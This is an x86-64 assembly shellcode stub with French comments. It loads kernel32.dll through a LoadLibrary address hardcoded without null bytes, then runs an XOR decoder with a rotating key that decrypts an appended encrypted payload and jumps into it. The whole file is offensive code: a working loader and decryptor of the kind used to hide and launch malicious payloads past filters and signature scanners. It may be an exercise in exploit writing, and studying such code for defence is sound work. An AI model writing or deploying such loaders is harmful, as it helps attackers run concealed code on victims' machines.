BITS 64

;mise en place du contexte
push rbp
mov rbp, rsp
sub rsp, 0x30

isInBox:
	xor rdx,rdx ; rdx <- 0
	jmp short GetLibrary
LibraryReturn:
	pop rax ; rax <- adresse du nom de la lib
	mov [rax + 13], dl  ; remplace N par \0
LoadDLL:
	inc rax
	mov rcx, rax
	mov rax, 0x76FC6501 ; rax <- LoadLibrary + 1, pour eviter 0
	dec rax ; rax <- LoadLibrary
	call rax ; Appel de LoadLibrary
	cmp rax, rdx
	jne DLLLoaded ; si non chargé, on quitte
	xor rax, rax
	jmp finLoadDLL
DLLLoaded:
	jmp AsDLL
finLoadDLL:
	pop rbp
	ret

GetLibrary:
	call LibraryReturn
kernel32:
	db 'Akernel32.dllN' 

AsDLL:
jmp code
startOfDecoder:
	pop rax ; eax <- adresse cle (rip prec)
	mov rcx, [rax] ; rcx <- clé
	mov rdx, [rax+8] ; rdx <- taille du chiffré
	add rax, 16 ; rax <- addresse chiffré
	mov [rbp-8], rax ; [ebp-8] <- adresse chiffré
	mov rsi, rax ; adresse du char courant
	xor rax, rax ; initialisation du compteur de boucle
	; contexte
	; rcx = clé
	; rdx = taille du chiffré
	; rax = numero du caractere courant a déchiffrer
	; rsi = adresse du chiffré
decode:
	cmp rdx, rax ; num car == taille chiffré ? 
	jne continueDecode
	jmp [rbp-8] ; tout est déchiffré, appel du shell code
	continueDecode:
	xor [rsi + rax], cl ; on déchiffre
	ror rcx, 8
	inc rax ; on passe au caractère suivant
	jmp decode
code:
	call startOfDecoder ; rip <- addresse de la clé
	; clé
	; taille
	; chiffré
